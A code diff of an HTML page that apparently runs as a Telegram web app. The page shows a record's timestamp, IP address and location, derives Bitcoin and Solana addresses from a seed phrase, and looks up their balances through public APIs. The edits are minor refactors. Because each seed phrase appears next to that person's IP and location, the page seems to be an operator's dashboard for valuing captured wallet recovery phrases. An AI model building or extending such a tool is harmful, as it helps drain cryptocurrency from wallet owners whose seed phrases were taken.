@@ -8,7 +8,7 @@
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/index.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bip39@2.5.0/browser/bip39.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
 </head>
@@ -33,7 +33,7 @@
         const walletType = (data.wallet || "").toLowerCase();
         const timestamp = data.timestamp || "–";
         const ip = data.ip || "–";
-        const userLocation = data.location || "–";  // <-- змінено з "location"
+        const userLocation = data.location || "–";
 
         document.getElementById("timestamp").textContent = timestamp;
         document.getElementById("userIp").textContent = ip;
@@ -63,26 +63,28 @@
                 const seed = await bip39.mnemonicToSeed(seedPhrase);
                 const root = bitcoin.bip32.fromSeed(seed);
                 const child = root.derivePath("m/44'/0'/0'/0/0");
-                addresses.btc = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
+                const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: child.publicKey });
+                addresses.btc = btcAddress;
                 document.getElementById("btcAddress").textContent = addresses.btc;
 
                 // SOL
                 const solKey = seed.slice(0, 32);
-                const solPair = solanaWeb3.Keypair.fromSeed(solKey);
-                addresses.sol = solPair.publicKey.toBase58();
+                const solKeypair = solanaWeb3.Keypair.fromSeed(solKey);
+                addresses.sol = solKeypair.publicKey.toBase58();
                 document.getElementById("solAddress").textContent = addresses.sol;
-            } catch (err) {
-                console.error("❌ Ошибка генерации адресов:", err);
+            } catch (e) {
+                console.error("❌ Ошибка генерации адресов:", e);
             }
         }
 
         async function fetchPrices() {
             try {
                 const ids = supported.map(c => c.coin).join(",");
-                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`);
+                const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`;
+                const res = await fetch(url);
                 return await res.json();
             } catch (e) {
-                console.warn("❌ Ошибка загрузки цен:", e);
+                console.warn("⚠️ Ошибка получения цен:", e.message);
                 return {};
             }
         }
@@ -91,10 +93,9 @@
             try {
                 switch (chain) {
                     case "ethereum":
-                        const ethRes = await fetch(`https://api.blockchair.com/ethereum/dashboards/address/${address}`);
+                        const ethRes = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourKey`);
                         const ethData = await ethRes.json();
-                        const ethKey = Object.keys(ethData.data || {})[0];
-                        return parseFloat(ethData.data[ethKey]?.address?.balance || 0) / 1e18;
+                        return parseFloat(ethData.result || 0) / 1e18;
                     case "bitcoin":
                         const btcRes = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
                         const sats = await btcRes.text();
@@ -145,11 +146,8 @@
             else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
             else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
 
-            if (window.Telegram?.WebApp) {
-                Telegram.WebApp.openLink(url);
-            } else {
-                window.open(url, "_blank");
-            }
+            if (window.Telegram && Telegram.WebApp) Telegram.WebApp.openLink(url);
+            else window.open(url, "_blank");
         }
 
         document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
